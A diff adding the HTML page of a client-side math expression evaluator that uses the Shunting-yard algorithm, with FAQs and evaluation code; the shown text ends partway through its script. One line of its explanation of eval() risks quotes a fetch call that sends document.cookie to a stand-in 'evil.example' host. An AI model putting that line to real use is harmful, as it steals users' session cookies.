@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#10b981">
+  <title>Math Expression Evaluator — Free Online Tool | ThisDevTool</title>
+  <meta name="description" content="Evaluate math expressions safely in your browser. Supports +, -, *, /, ^, %, sqrt, sin, cos, tan, log, ln, abs, pi, e. Shows RPN stack and step-by-step evaluation. No eval().">
+  <link rel="canonical" href="https://thisdevtool.com/tools/math-expression.html">
+  <meta property="og:title" content="Math Expression Evaluator — ThisDevTool">
+  <meta property="og:description" content="Safe math expression evaluator using Shunting-yard algorithm. Supports trig functions, logarithms, exponents, and more. 100% client-side.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://thisdevtool.com/tools/math-expression.html">
+  <meta property="og:image" content="https://thisdevtool.com/images/og-default.png">
+  <meta name="twitter:card" content="summary">
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="manifest" href="/manifest.json">
+  <link rel="stylesheet" href="/css/style.css?v=3">
+  <script src="/js/core.js?v=3"></script>
+  <script src="/js/ads.js?v=3"></script>
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebApplication",
+    "name": "Math Expression Evaluator",
+    "url": "https://thisdevtool.com/tools/math-expression.html",
+    "description": "Safe browser-based math expression evaluator using the Shunting-yard algorithm. No eval(), supports trig, logarithms, and exponents.",
+    "applicationCategory": "DeveloperApplication",
+    "operatingSystem": "Any",
+    "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" }
+  }
+  </script>
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "FAQPage",
+    "mainEntity": [
+      {
+        "@type": "Question",
+        "name": "Is it safe to evaluate math expressions in the browser without eval()?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Yes. This tool uses the Shunting-yard algorithm to parse expressions into Reverse Polish Notation (RPN) and then evaluates the RPN stack using only arithmetic operations. No eval() or Function() constructor is used, so no arbitrary JavaScript can be executed."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "What mathematical functions are supported?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Supported functions include: sqrt (square root), sin, cos, tan (trigonometric in degrees or radians), asin, acos, atan, log (base-10), ln (natural log), abs (absolute value), floor, ceil, round, exp, and sign. Constants pi and e are also supported."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "What is the Shunting-yard algorithm?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "The Shunting-yard algorithm, invented by Edsger Dijkstra, converts infix notation (the standard way humans write math, like 3 + 4 * 2) into Reverse Polish Notation (RPN, like 3 4 2 * +). RPN can then be evaluated with a simple stack, making it ideal for safe expression evaluation without recursive descent parsing."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Why does sqrt(144) + 2^3 equal 20?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "sqrt(144) evaluates to 12 (since 12 × 12 = 144). 2^3 evaluates to 8 (since 2 × 2 × 2 = 8). Adding them together gives 12 + 8 = 20. The exponent operator ^ has higher precedence than +, so it is evaluated first."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Are trigonometric functions evaluated in degrees or radians?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "You can toggle between degrees and radians using the DEG/RAD chip above the input. In degree mode, sin(90) returns 1. In radian mode, sin(3.14159) returns approximately 0. The default is degree mode, which is more intuitive for most users."
+        }
+      }
+    ]
+  }
+  </script>
+  <style>
+    .expr-input-row {
+      display: flex;
+      gap: 8px;
+      align-items: stretch;
+      margin-bottom: 8px;
+    }
+    .expr-input-row input[type="text"] {
+      flex: 1;
+      font-family: var(--font-mono, monospace);
+      font-size: 1.1rem;
+      padding: 10px 14px;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--bg-secondary);
+      color: var(--text-primary);
+      outline: none;
+      transition: border-color 0.15s;
+    }
+    .expr-input-row input[type="text"]:focus {
+      border-color: #10b981;
+    }
+    .expr-result-box {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 16px;
+      margin-bottom: 12px;
+      min-height: 56px;
+    }
+    .expr-result-value {
+      font-family: var(--font-mono, monospace);
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: #10b981;
+      word-break: break-all;
+    }
+    .expr-result-expr {
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+      margin-top: 4px;
+    }
+    .steps-panel {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 12px 16px;
+      margin-bottom: 12px;
+    }
+    .steps-panel h3 {
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--text-secondary);
+      margin: 0 0 8px;
+    }
+    .token-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 4px;
+      margin-bottom: 10px;
+    }
+    .token {
+      display: inline-flex;
+      align-items: center;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-family: var(--font-mono, monospace);
+      font-size: 0.82rem;
+      font-weight: 600;
+    }
+    .token-num { background: #d1fae5; color: #065f46; }
+    .token-op  { background: #fef3c7; color: #92400e; }
+    .token-fn  { background: #ede9fe; color: #5b21b6; }
+    .token-paren { background: #e5e7eb; color: #374151; }
+    .dark .token-num { background: #064e3b; color: #6ee7b7; }
+    .dark .token-op  { background: #451a03; color: #fcd34d; }
+    .dark .token-fn  { background: #2e1065; color: #c4b5fd; }
+    .dark .token-paren { background: #374151; color: #d1d5db; }
+    .rpn-display {
+      font-family: var(--font-mono, monospace);
+      font-size: 0.85rem;
+      color: var(--text-primary);
+      margin-bottom: 8px;
+    }
+    .steps-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.8rem;
+      font-family: var(--font-mono, monospace);
+    }
+    .steps-table th {
+      text-align: left;
+      padding: 4px 8px;
+      border-bottom: 1px solid var(--border);
+      color: var(--text-secondary);
+      font-weight: 600;
+    }
+    .steps-table td {
+      padding: 3px 8px;
+      border-bottom: 1px solid var(--border);
+      color: var(--text-primary);
+    }
+    .steps-table tr:last-child td { border-bottom: none; }
+    .history-list {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+    .history-list li {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 12px;
+      border-bottom: 1px solid var(--border);
+      cursor: pointer;
+      transition: background 0.1s;
+      gap: 12px;
+    }
+    .history-list li:last-child { border-bottom: none; }
+    .history-list li:hover { background: var(--bg-hover, rgba(16,185,129,0.07)); }
+    .history-expr {
+      font-family: var(--font-mono, monospace);
+      font-size: 0.88rem;
+      color: var(--text-secondary);
+      flex: 1;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    .history-val {
+      font-family: var(--font-mono, monospace);
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: #10b981;
+      white-space: nowrap;
+    }
+    .ref-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; margin-top: 8px; }
+    .ref-table th { text-align: left; padding: 6px 10px; background: var(--bg-secondary); color: var(--text-secondary); font-weight: 600; border-bottom: 2px solid var(--border); }
+    .ref-table td { padding: 5px 10px; border-bottom: 1px solid var(--border); }
+    .ref-table code { background: var(--bg-secondary); padding: 1px 5px; border-radius: 3px; font-size: 0.82rem; }
+    .panel-hidden { display: none; }
+    .empty-state { text-align: center; color: var(--text-secondary); padding: 32px 16px; font-size: 0.9rem; }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header class="site-header">
+    <div class="header-inner">
+      <a href="/" class="site-logo">ThisDevTool</a>
+      <nav class="header-nav">
+        <a href="/">All Tools</a>
+        <a href="/tools/boolean-evaluator.html">Boolean Eval</a>
+        <a href="/tools/bitwise-calculator.html">Bitwise Calc</a>
+        <button class="theme-toggle" aria-label="Toggle dark mode"></button>
+      </nav>
+    </div>
+  </header>
+
+  <div class="page-wrapper">
+    <div class="ad-slot ad-slot-banner" data-ad="top-banner">Ad</div>
+
+    <div class="content-grid">
+      <div class="main-content">
+        <div class="tool-card-page">
+          <h1>Math Expression Evaluator</h1>
+          <p class="tool-subtitle">Safely evaluate math expressions using the Shunting-yard algorithm — no eval(). Supports functions, constants, and step-by-step tracing.</p>
+
+          <div class="option-chips">
+            <button class="option-chip active" data-panel="calculate">Calculate</button>
+            <button class="option-chip" data-panel="history">History</button>
+            <button class="option-chip" data-panel="reference">Reference</button>
+            <button class="option-chip" data-mode="deg" id="angleChip">DEG</button>
+          </div>
+
+          <!-- Calculate Panel -->
+          <div id="panel-calculate">
+            <div class="expr-input-row">
+              <input type="text" id="exprInput" placeholder="e.g. sqrt(144) + 2^3" autocomplete="off" spellcheck="false" aria-label="Math expression">
+              <button class="btn btn-primary" id="calcBtn">= Evaluate</button>
+              <button class="btn btn-secondary" id="clearExprBtn">Clear</button>
+            </div>
+
+            <div class="expr-result-box" id="resultBox">
+              <div class="expr-result-value" id="resultValue">—</div>
+              <div class="expr-result-expr" id="resultExpr">Enter an expression above and press Evaluate or Enter</div>
+            </div>
+
+            <div class="steps-panel" id="stepsPanel" style="display:none;">
+              <h3>Tokens</h3>
+              <div class="token-list" id="tokenList"></div>
+              <h3>Reverse Polish Notation (RPN)</h3>
+              <div class="rpn-display" id="rpnDisplay"></div>
+              <h3>Evaluation Steps</h3>
+              <table class="steps-table">
+                <thead><tr><th>#</th><th>Action</th><th>Stack</th></tr></thead>
+                <tbody id="stepsBody"></tbody>
+              </table>
+            </div>
+
+            <div class="status-bar info" id="statusBar" role="status" aria-live="polite">
+              Enter a math expression and press Evaluate or hit Enter.
+            </div>
+
+            <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap;">
+              <button class="btn btn-sm btn-secondary" data-example="sqrt(144) + 2^3">sqrt(144)+2^3</button>
+              <button class="btn btn-sm btn-secondary" data-example="sin(30) + cos(60)">sin(30)+cos(60)</button>
+              <button class="btn btn-sm btn-secondary" data-example="log(1000) * ln(e)">log(1000)*ln(e)</button>
+              <button class="btn btn-sm btn-secondary" data-example="(pi * 5^2)">pi*5² (circle area r=5)</button>
+              <button class="btn btn-sm btn-secondary" data-example="abs(-42) % 10">abs(-42)%10</button>
+            </div>
+          </div>
+
+          <!-- History Panel -->
+          <div id="panel-history" class="panel-hidden">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+              <span style="font-size:0.9rem;color:var(--text-secondary);">Click any entry to re-evaluate it.</span>
+              <button class="btn btn-sm btn-secondary" id="clearHistoryBtn">Clear All</button>
+            </div>
+            <div style="background:var(--bg-secondary);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;">
+              <ul class="history-list" id="historyList">
+                <li class="empty-state" style="display:block;border:none;">No calculations yet. Switch to Calculate tab and evaluate an expression.</li>
+              </ul>
+            </div>
+          </div>
+
+          <!-- Reference Panel -->
+          <div id="panel-reference" class="panel-hidden">
+            <table class="ref-table">
+              <thead><tr><th>Syntax</th><th>Description</th><th>Example</th><th>Result</th></tr></thead>
+              <tbody>
+                <tr><td><code>+  -  *  /</code></td><td>Basic arithmetic</td><td><code>10 / 4</code></td><td>2.5</td></tr>
+                <tr><td><code>^</code></td><td>Exponentiation</td><td><code>2^10</code></td><td>1024</td></tr>
+                <tr><td><code>%</code></td><td>Modulo (remainder)</td><td><code>17 % 5</code></td><td>2</td></tr>
+                <tr><td><code>sqrt(x)</code></td><td>Square root</td><td><code>sqrt(225)</code></td><td>15</td></tr>
+                <tr><td><code>abs(x)</code></td><td>Absolute value</td><td><code>abs(-7)</code></td><td>7</td></tr>
+                <tr><td><code>sin(x)</code></td><td>Sine (DEG or RAD)</td><td><code>sin(90)</code></td><td>1</td></tr>
+                <tr><td><code>cos(x)</code></td><td>Cosine (DEG or RAD)</td><td><code>cos(0)</code></td><td>1</td></tr>
+                <tr><td><code>tan(x)</code></td><td>Tangent (DEG or RAD)</td><td><code>tan(45)</code></td><td>1</td></tr>
+                <tr><td><code>asin(x)</code></td><td>Arcsine → degrees/rad</td><td><code>asin(1)</code></td><td>90</td></tr>
+                <tr><td><code>acos(x)</code></td><td>Arccosine → degrees/rad</td><td><code>acos(0)</code></td><td>90</td></tr>
+                <tr><td><code>atan(x)</code></td><td>Arctangent → degrees/rad</td><td><code>atan(1)</code></td><td>45</td></tr>
+                <tr><td><code>log(x)</code></td><td>Logarithm base 10</td><td><code>log(1000)</code></td><td>3</td></tr>
+                <tr><td><code>ln(x)</code></td><td>Natural logarithm</td><td><code>ln(e)</code></td><td>1</td></tr>
+                <tr><td><code>exp(x)</code></td><td>e raised to power x</td><td><code>exp(1)</code></td><td>2.718…</td></tr>
+                <tr><td><code>floor(x)</code></td><td>Round down to integer</td><td><code>floor(3.9)</code></td><td>3</td></tr>
+                <tr><td><code>ceil(x)</code></td><td>Round up to integer</td><td><code>ceil(3.1)</code></td><td>4</td></tr>
+                <tr><td><code>round(x)</code></td><td>Round to nearest integer</td><td><code>round(3.5)</code></td><td>4</td></tr>
+                <tr><td><code>sign(x)</code></td><td>Sign of number (-1/0/1)</td><td><code>sign(-99)</code></td><td>-1</td></tr>
+                <tr><td><code>pi</code></td><td>π ≈ 3.14159…</td><td><code>2 * pi * 5</code></td><td>31.416…</td></tr>
+                <tr><td><code>e</code></td><td>Euler's number ≈ 2.718…</td><td><code>e^2</code></td><td>7.389…</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="ad-slot ad-slot-inline" data-ad="mid-content">Ad</div>
+
+        <div class="content-section">
+          <h2>How to Use the Math Expression Evaluator</h2>
+          <ol>
+            <li><strong>Type an expression</strong> in the input field, for example <code>sqrt(144) + 2^3</code> or <code>sin(45) * cos(45)</code>.</li>
+            <li><strong>Press Enter or click Evaluate</strong> — the result appears immediately, along with a token breakdown and step-by-step evaluation trace.</li>
+            <li><strong>Toggle DEG/RAD</strong> using the chip button to switch trigonometric functions between degree mode (default) and radian mode.</li>
+            <li><strong>View History</strong> to see all past calculations. Click any entry to reload it into the input.</li>
+            <li><strong>Check Reference</strong> for a full list of supported functions and constants with examples.</li>
+          </ol>
+
+          <h2>What This Tool Does</h2>
+          <p>The Math Expression Evaluator parses and computes mathematical expressions entirely in your browser using the <strong>Shunting-yard algorithm</strong> invented by Edsger Dijkstra. Unlike most online calculators that simply call JavaScript's <code>eval()</code> function — which executes arbitrary code and is a significant security risk — this tool tokenises the input, converts it to Reverse Polish Notation (RPN), and evaluates the RPN stack using safe arithmetic only.</p>
+
+          <h3>What Is the Shunting-yard Algorithm?</h3>
+          <p>The Shunting-yard algorithm processes an infix expression (e.g. <code>3 + 4 * 2</code>) token by token, using an operator stack and an output queue to produce an equivalent postfix (RPN) expression. The name "shunting yard" is a railway analogy: the algorithm shunts tokens like a train-yard worker shunts rail cars between tracks. The key insight is that operator precedence and parentheses are handled entirely during the shunting phase, making the evaluation phase trivial — just push numbers onto a stack, and when you hit an operator, pop operands and push the result.</p>
+
+          <h3>Why Avoid eval()?</h3>
+          <p>JavaScript's <code>eval()</code> function executes any string as JavaScript code. This means that if user input contains <code>fetch('https://evil.example/steal?data=' + document.cookie)</code>, it will run. Most simple online calculators use <code>eval()</code> or the <code>Function()</code> constructor because they are easy to implement, but neither is safe for untrusted input. The Shunting-yard approach only ever performs numeric operations, making it completely immune to code injection attacks.</p>
+
+          <h3>Supported Operators and Precedence</h3>
+          <p>Operators are evaluated in this order (highest to lowest precedence): functions like sqrt and sin are applied first, then the exponentiation operator <code>^</code> (right-associative), then multiplication <code>*</code>, division <code>/</code>, and modulo <code>%</code>, and finally addition <code>+</code> and subtraction <code>-</code>. Parentheses override all precedence rules. You can nest parentheses as deeply as needed: <code>((2 + 3) * (4 - 1)) ^ 2</code> evaluates correctly.</p>
+
+          <h3>Degree vs. Radian Mode</h3>
+          <p>Trigonometric functions — sin, cos, tan, asin, acos, atan — can operate in either degree mode or radian mode. In <strong>degree mode</strong> (default), <code>sin(90)</code> returns exactly 1, <code>cos(180)</code> returns -1, and <code>tan(45)</code> returns 1. In <strong>radian mode</strong>, you pass values like <code>sin(pi/2)</code> or <code>cos(pi)</code>. Most students and engineers find degree mode more natural for quick calculations, while mathematicians and programmers often prefer radians. Switch modes with the DEG/RAD toggle at any time — the current expression is immediately re-evaluated.</p>
+
+          <h3>Reading the Step-by-Step Trace</h3>
+          <p>After evaluating an expression, the tool shows three sections. <strong>Tokens</strong> shows how the input was broken into individual elements: numbers (green), operators (yellow), functions (purple), and parentheses (grey). <strong>RPN</strong> shows the Reverse Polish Notation form of your expression after the Shunting-yard algorithm. <strong>Evaluation Steps</strong> shows the stack state at each step of the RPN evaluation — each row shows what action was taken (push a number, or apply an operator to the top two stack elements) and what the stack contained after that step. This makes the algorithm transparent and educational.</p>
+
+          <h3>Practical Use Cases</h3>
+          <p>This evaluator is useful for developers who need a quick calculation without leaving the browser, for students learning about expression parsing and compiler design, for verifying formulas before coding them into applications, and for educators who want to show how computers evaluate mathematical notation. The history feature lets you build up a series of related calculations and refer back to earlier results. The reference panel provides a complete cheat sheet of every supported function with example inputs and outputs.</p>
+        </div>
+
+        <div class="content-section faq-section">
+          <h2>Frequently Asked Questions</h2>
+
+          <div class="faq-item">
+            <button class="faq-question">Is it safe to evaluate math expressions in the browser without eval()?</button>
+            <div class="faq-answer">Yes. This tool uses the Shunting-yard algorithm to parse expressions into Reverse Polish Notation and then evaluates the RPN stack using only arithmetic operations. No eval() or Function() constructor is used, so no arbitrary JavaScript can be executed — even if you paste in code-like text.</div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">What mathematical functions are supported?</button>
+            <div class="faq-answer">Supported functions include: sqrt, sin, cos, tan, asin, acos, atan, log (base 10), ln (natural log), abs, floor, ceil, round, exp, and sign. Constants pi and e are recognised. Operators supported: +, -, *, /, ^ (exponentiation), % (modulo). See the Reference tab for a full table with examples.</div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">What is the Shunting-yard algorithm?</button>
+            <div class="faq-answer">The Shunting-yard algorithm, invented by Edsger Dijkstra, converts infix notation (how humans normally write math, like 3 + 4 * 2) into Reverse Polish Notation (like 3 4 2 * +). RPN can then be evaluated with a simple stack: push numbers, and when you hit an operator, pop two numbers, apply the operator, and push the result back.</div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">Why does sqrt(144) + 2^3 equal 20?</button>
+            <div class="faq-answer">sqrt(144) evaluates to 12 (because 12 × 12 = 144). 2^3 evaluates to 8 (because 2 × 2 × 2 = 8). Adding them gives 12 + 8 = 20. The exponent operator ^ has higher precedence than addition, so it is evaluated before the +. You can see every step in the evaluation trace shown below the result.</div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">Are trigonometric functions evaluated in degrees or radians?</button>
+            <div class="faq-answer">You can toggle between degrees and radians using the DEG/RAD chip. In degree mode (default), sin(90) returns 1. In radian mode, sin(3.14159) returns approximately 0 (sin of π radians). Toggle the mode at any time — the current expression is immediately re-evaluated in the new angle unit.</div>
+          </div>
+        </div>
+      </div>
+
+      <aside>
+        <div class="ad-slot ad-slot-sidebar" data-ad="sidebar">Ad</div>
+      </aside>
+    </div>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-grid">
+      <div class="footer-col">
+        <h4>Math &amp; Logic</h4>
+        <a href="/tools/math-expression.html">Math Expression</a>
+        <a href="/tools/boolean-evaluator.html">Boolean Evaluator</a>
+        <a href="/tools/bitwise-calculator.html">Bitwise Calculator</a>
+        <a href="/tools/number-base-converter.html">Base Converter</a>
+      </div>
+      <div class="footer-col">
+        <h4>Developer Tools</h4>
+        <a href="/tools/json-formatter.html">JSON Formatter</a>
+        <a href="/tools/regex-tester.html">Regex Tester</a>
+        <a href="/tools/hash-generator.html">Hash Generator</a>
+        <a href="/tools/uuid-generator.html">UUID Generator</a>
+      </div>
+      <div class="footer-col">
+        <h4>Legal</h4>
+        <a href="/legal/privacy.html">Privacy Policy</a>
+        <a href="/legal/terms.html">Terms of Service</a>
+        <a href="/legal/dmca.html">DMCA</a>
+      </div>
+    </div>
+    <div class="footer-bottom">&copy; 2026 ThisDevTool. All tools run 100% in your browser.</div>
+  </footer>
+
+  <script>
+  (function () {
+    var DT = DevToolbox;
+
+    // ── State ──────────────────────────────────────────────────────────────
+    var angleMode = 'deg'; // 'deg' | 'rad'
+    var history   = [];
+    var activePanel = 'calculate';
+
+    // ── Helpers ────────────────────────────────────────────────────────────
+    function toRad(x) { return angleMode === 'deg' ? x * Math.PI / 180 : x; }
+    function fromRad(x) { return angleMode === 'deg' ? x * 180 / Math.PI : x; }
+
+    var FUNCTIONS = ['sqrt','sin','cos','tan','asin','acos','atan','log','ln','abs','floor','ceil','round','exp','sign'];
+    var PRECEDENCE = { '+': 1, '-': 1, '*': 2, '/': 2, '%': 2, '^': 3 };
+    var RIGHT_ASSOC = { '^': true };
+
+    function isDigit(ch) { return ch >= '0' && ch <= '9'; }
+    function isAlpha(ch) { return /[a-zA-Z_]/.test(ch); }
+
+    // ── Tokeniser ──────────────────────────────────────────────────────────
+    function tokenise(expr) {
+      var tokens = [];
+      var i = 0;
+      var s = expr.replace(/\s+/g, '');
+
+      while (i < s.length) {
+        var ch = s[i];
+
+        // Number (int or float, including leading dot)
+        if (isDigit(ch) || (ch === '.' && i + 1 < s.length && isDigit(s[i + 1]))) {
+          var num = '';
+          while (i < s.length && (isDigit(s[i]) || s[i] === '.')) num += s[i++];
+          tokens.push({ type: 'num', value: parseFloat(num) });
+          continue;
+        }
+
+        // Identifier: function name or constant (pi, e)
+        if (isAlpha(ch)) {
+          var name = '';
+          while (i < s.length && isAlpha(s[i])) name += s[i++];
+          if (name === 'pi') {
+            tokens.push({ type: 'num', value: Math.PI });
+          } else if (name === 'e') {
+            tokens.push({ type: 'num', value: Math.E });
+          } else if (FUNCTIONS.indexOf(name) !== -1) {
+            tokens.push({ type: 'fn', value: name });
+          } else {
+            throw new Error('Unknown function: ' + name);
+          }
+          continue;
+        }
+
+        // Operators and parentheses
+        if ('+-*/^%'.indexOf(ch) !== -1) {
+          // Handle unary minus: - after operator, open-paren, or at start
+          if (ch === '-') {
+            var prev = tokens[tokens.length - 1];
+            var isUnary = !prev || prev.type === 'op' || prev.type === 'fn' || (prev.type === 'paren' && prev.value === '(');
+            if (isUnary) {
+              // Treat as unary: push a 0 and then the minus operator
+              tokens.push({ type: 'num', value: 0 });
+            }
+          }
+          tokens.push({ type: 'op', value: ch });
+          i++;
+          continue;
+        }
+
+        if (ch === '(') { tokens.push({ type: 'paren', value: '(' }); i++; continue; }
+        if (ch === ')') { tokens.push({ type: 'paren', value: ')' }); i++; continue; }
+
+        throw new Error('Unexpected character: ' + ch);
+      }
+
+      return tokens;
+    }
+
+    // ── Shunting-yard → RPN ────────────────────────────────────────────────
+    function toRPN(tokens) {
+      var output = [];
+      var opStack = [];
+
+      for (var i = 0; i < tokens.length; i++) {
+        var tok = tokens[i];
+
+        if (tok.type === 'num') {
+          output.push(tok);
+        } else if (tok.type === 'fn') {
+          opStack.push(tok);
+        } else if (tok.type === 'op') {
+          while (opStack.length) {
+            var top = opStack[opStack.length - 1];
+            if (top.type === 'fn' ||
+               (top.type === 'op' && PRECEDENCE[top.value] !== undefined &&
+                (PRECEDENCE[top.value] > PRECEDENCE[tok.value] ||
+                 (PRECEDENCE[top.value] === PRECEDENCE[tok.value] && !RIGHT_ASSOC[tok.value])))) {
+              output.push(opStack.pop());
+            } else {
+              break;
+            }
+          }
+          opStack.push(tok);
+        } else if (tok.type === 'paren' && tok.value === '(') {
+          opStack.push(tok);
+        } else if (tok.type === 'paren' && tok.value === ')') {
+          while (opStack.length && !(opStack[opStack.length - 1].type === 'paren' && opStack[opStack.length - 1].value === '(')) {
+            output.push(opStack.pop());
+          }
+          if (!opStack.length) throw new Error('Mismatched parentheses');
+          opStack.pop(); // remove '('
+          if (opStack.length && opStack[opStack.length - 1].type === 'fn') {
+            output.push(opStack.pop());
+          }
+        }
+      }
+
+      while (opStack.length) {
+        var top2 = opStack[opStack.length - 1];
+        if (top2.type === 'paren') throw new Error('Mismatched parentheses');
+        output.push(opStack.pop());
+      }
+
+      return output;
+    }
+
+    // ── RPN Evaluator (with steps) ─────────────────────────────────────────
+    function evalRPN(rpn) {
+      var stack = [];
+      var steps = [];
+
+      function applyOp(op, a, b) {
+        switch (op) {
+          case '+': return a + b;
+          case '-': return a - b;
+          case '*': return a * b;
+          case '/':
+            if (b === 0) throw new Error('Division by zero');
+            return a / b;
+          case '^': return Math.pow(a, b);
+          case '%': return a % b;
+          default: throw new Error('Unknown operator: ' + op);
+        }
+      }
+
+      function applyFn(name, x) {
+        switch (name) {
+          case 'sqrt':  if (x < 0) throw new Error('sqrt of negative'); return Math.sqrt(x);
+          case 'sin':   return Math.sin(toRad(x));
+          case 'cos':   return Math.cos(toRad(x));
+          case 'tan':   return Math.tan(toRad(x));
+          case 'asin':  return fromRad(Math.asin(x));
+          case 'acos':  return fromRad(Math.acos(x));
+          case 'atan':  return fromRad(Math.atan(x));
+          case 'log':   if (x <= 0) throw new Error('log of non-positive'); return Math.log10(x);
+          case 'ln':    if (x <= 0) throw new Error('ln of non-positive'); return Math.log(x);
+          case 'abs':   return Math.abs(x);
+          case 'floor': return Math.floor(x);
+          case 'ceil':  return Math.ceil(x);
+          case 'round': return Math.round(x);
+          case 'exp':   return Math.exp(x);
+          case 'sign':  return Math.sign(x);
+          default: throw new Error('Unknown function: ' + name);
+        }
+      }
+
+      function fmt(n) {
+        if (typeof n !== 'number') return String(n);
+        // Show up to 10 significant digits, trim trailing zeros
+        var s = parseFloat(n.toPrecision(10));
+        return String(s);
+      }
+
+      for (var i = 0; i < rpn.length; i++) {
+        var tok = rpn[i];
+        if (tok.type === 'num') {
+          stack.push(tok.value);
+          steps.push({ action: 'Push ' + fmt(tok.value), stack: stack.slice() });
+        } else if (tok.type === 'op') {
+          if (stack.length < 2) throw new Error('Not enough operands for operator ' + tok.value);
+          var b = stack.pop();
+          var a = stack.pop();
+          var res = applyOp(tok.value, a, b);
+          stack.push(res);
+          steps.push({ action: fmt(a) + ' ' + tok.value + ' ' + fmt(b) + ' = ' + fmt(res), stack: stack.slice() });
+        } else if (tok.type === 'fn') {
+          if (stack.length < 1) throw new Error('Not enough operands for function ' + tok.value);
+          var x = stack.pop();
+          var fres = applyFn(tok.value, x);
+          stack.push(fres);
+          steps.push({ action: tok.value + '(' + fmt(x) + ') = ' + fmt(fres), stack: stack.slice() });
+        }
+      }
+
+      if (stack.length !== 1) throw new Error('Invalid expression');
+      return { result: stack[0], steps: steps };
+    }
+
+    // ── Format result ──────────────────────────────────────────────────────
+    function formatResult(n) {
+      if (!isFinite(n)) return String(n);
+      // If very close to an integer, show as integer
+      if (Math.abs(n - Math.round(n)) < 1e-10) return String(Math.round(n));
+      // Otherwise up to 10 significant digits
+      return parseFloat(n.toPrecision(10)).toString();
+    }
+
+    // ── Render tokens ──────────────────────────────────────────────────────
+    function renderTokens(tokens) {
+      var list = document.getElementById('tokenList');
+      list.innerHTML = '';
+      tokens.forEach(function (tok) {
+        var span = document.createElement('span');
+        var cls = 'token';
+        if (tok.type === 'num') { cls += ' token-num'; span.textContent = typeof tok.value === 'number' && tok.value === Math.PI ? 'π' : typeof tok.value === 'number' && tok.value === Math.E ? 'e' : tok.value; }
+        else if (tok.type === 'op') { cls += ' token-op'; span.textContent = tok.value; }
+        else if (tok.type === 'fn') { cls += ' token-fn'; span.textContent = tok.value + '(…)'; }
+        else if (tok.type === 'paren') { cls += ' token-paren'; span.textContent = tok.value; }
+        span.className = cls;
+        list.appendChild(span);
+      });
+    }
+
+    // ── Render RPN ─────────────────────────────────────────────────────────
+    function renderRPN(rpn) {
+      var parts = rpn.map(function (tok) {
+        if (tok.type === 'num') {
+          var v = tok.value;
+          if (Math.abs(v - Math.PI) < 1e-10) return 'π';
+          if (Math.abs(v - Math.E) < 1e-10) return 'e';
+          return parseFloat(v.toPrecision(8)).toString();
+        }
+        return tok.value;
+      });
+      document.getElementById('rpnDisplay').textContent = parts.join('  ');
+    }
+
+    // ── Render steps ───────────────────────────────────────────────────────
+    function renderSteps(steps) {
+      var tbody = document.getElementById('stepsBody');
+      tbody.innerHTML = '';
+      steps.forEach(function (step, idx) {
+        var tr = document.createElement('tr');
+        var stackStr = '[' + step.stack.map(function (n) { return parseFloat(n.toPrecision(6)); }).join(', ') + ']';
+        tr.innerHTML = '<td>' + (idx + 1) + '</td><td>' + step.action + '</td><td>' + stackStr + '</td>';
+        tbody.appendChild(tr);
+      });
+    }
+
+    // ── Main evaluate ──────────────────────────────────────────────────────
+    function evaluate() {
+      var raw = document.getElementById('exprInput').value.trim();
+      var statusBar = document.getElementById('statusBar');
+      var resultValue = document.getElementById('resultValue');
+      var resultExpr  = document.getElementById('resultExpr');
+      var stepsPanel  = document.getElementById('stepsPanel');
+
+      if (!raw) {
+        resultValue.textContent = '—';
+        resultExpr.textContent = 'Enter an expression above and press Evaluate or Enter';
+        stepsPanel.style.display = 'none';
+        statusBar.className = 'status-bar info';
+        statusBar.textContent = 'Enter a math expression and press Evaluate or hit Enter.';
+        return;
+      }
+
+      try {
+        var tokens = tokenise(raw);
+        var rpn    = toRPN(tokens);
+        var evaled = evalRPN(rpn);
+        var result = evaled.result;
+        var resultStr = formatResult(result);
+
+        resultValue.textContent = resultStr;
